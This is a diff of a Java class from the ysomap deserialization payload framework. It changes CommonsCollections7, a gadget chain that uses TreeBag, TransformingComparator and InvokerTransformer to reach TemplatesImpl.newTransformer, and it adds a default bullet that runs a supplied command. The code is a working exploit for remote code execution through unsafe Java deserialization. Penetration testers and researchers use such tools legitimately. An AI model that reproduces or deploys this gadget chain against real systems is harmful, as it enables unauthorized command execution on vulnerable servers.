@@ -4,12 +4,14 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.apache.commons.collections4.bag.TreeBag;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.InvokerTransformer;
-import ysomap.PayloadTester;
+import ysomap.runner.PayloadTester;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
 import ysomap.gadget.ObjectGadget;
 import ysomap.gadget.bullet.TemplatesImplBullet;
 import ysomap.gadget.payload.Payload;
+import ysomap.serializer.Serializer;
+import ysomap.serializer.SerializerFactory;
 import ysomap.util.Reflections;
 
 /**
@@ -28,6 +30,11 @@ public class CommonsCollections7 extends Payload<TreeBag> {
     }
 
     @Override
+    public Serializer<?> getSerializer() {
+        return SerializerFactory.createSerializer("");
+    }
+
+    @Override
     public TreeBag pack(Object obj) throws Exception {
         // setup harmless chain
         final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
@@ -43,6 +50,11 @@ public class CommonsCollections7 extends Payload<TreeBag> {
         Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
 
         return tree;
+    }
+
+    @Override
+    public ObjectGadget getDefaultBullet(String command) {
+        return new TemplatesImplBullet(command);
     }
 
     public static void main(String[] args) {
